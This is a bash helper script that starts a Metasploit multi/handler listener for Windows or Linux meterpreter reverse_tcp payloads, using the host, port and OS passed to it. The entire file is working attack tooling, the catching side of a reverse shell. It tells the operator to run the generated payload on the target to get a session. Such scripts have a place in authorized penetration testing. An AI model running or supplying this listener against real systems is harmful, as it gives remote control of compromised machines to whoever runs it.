#!/usr/bin/env bash
# Start Metasploit multi/handler listener. Intended to be run in a new terminal (blocking).
# Usage: start_listener.sh <LHOST> <LPORT> <windows|linux>
set -euo pipefail

if [ "$#" -lt 3 ]; then
  echo "Usage: $0 <LHOST> <LPORT> <windows|linux>" >&2
  exit 1
fi

LHOST="$1"
LPORT="$2"
OS="${3,,}"

case "$OS" in
  windows)
    PAYLOAD="windows/x64/meterpreter/reverse_tcp"
    ;;
  linux)
    PAYLOAD="linux/x64/meterpreter/reverse_tcp"
    ;;
  *)
    echo "OS must be 'linux' or 'windows'" >&2
    exit 1
    ;;
esac

if ! command -v msfconsole >/dev/null 2>&1; then
  echo "msfconsole not found. Install Metasploit Framework." >&2
  exit 1
fi

echo "[*] Starting listener: LHOST=$LHOST LPORT=$LPORT (payload=$PAYLOAD)"
echo "[*] Run the generated payload on the target to get a session."
echo ""

# -q = quiet, -x = run commands then stay interactive for sessions
msfconsole -q -x "
use multi/handler
set payload $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
run
"
